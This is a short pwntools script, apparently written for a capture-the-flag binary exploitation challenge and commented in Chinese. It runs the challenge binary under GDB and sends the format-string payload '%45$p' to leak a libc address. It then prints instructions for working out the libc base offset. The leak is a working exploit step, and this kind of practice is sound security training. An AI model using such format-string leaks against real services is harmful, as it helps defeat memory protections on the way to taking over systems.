# offset_calculator.py
#!/usr/-bin/env python3
from pwn import *

# 载入我们凑齐的三件套
exe = ELF("./shop-revenge-from-docker")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe
context.log_level = 'info'

# 使用完整的三件套来启动 GDB，创造最完美的模拟环境
io = gdb.debug([ld.path, exe.path], env={"LD_PRELOAD": libc.path}, gdbscript='''
    # 在 printf 之后停下
    b *get_input+167
    continue
''')

# 使用 remote 环境下的 Libc 洩漏偏移量 %45$p
payload = b'%45$p' 
io.sendlineafter(b'exit\n', payload)
io.recvuntil(b'here is your choice\n')
leaked_libc_addr = int(io.recvline().strip(), 16)
log.info(f"洩漏出的 Libc 动态地址是: {hex(leaked_libc_addr)}")

log.warning("="*60)
log.warning("!!! GDB 已暂停，请切换到 GDB 视窗进行最终计算 !!!")
log.warning("1. 输入 `vmmap` 找到 libc.so.6 的基底位址 (Start)。")
log.warning(f"2. 输入 `p/x {hex(leaked_libc_addr)} - <Libc 基底位址>` 来计算偏移。")
log.warning("="*60)

io.interactive()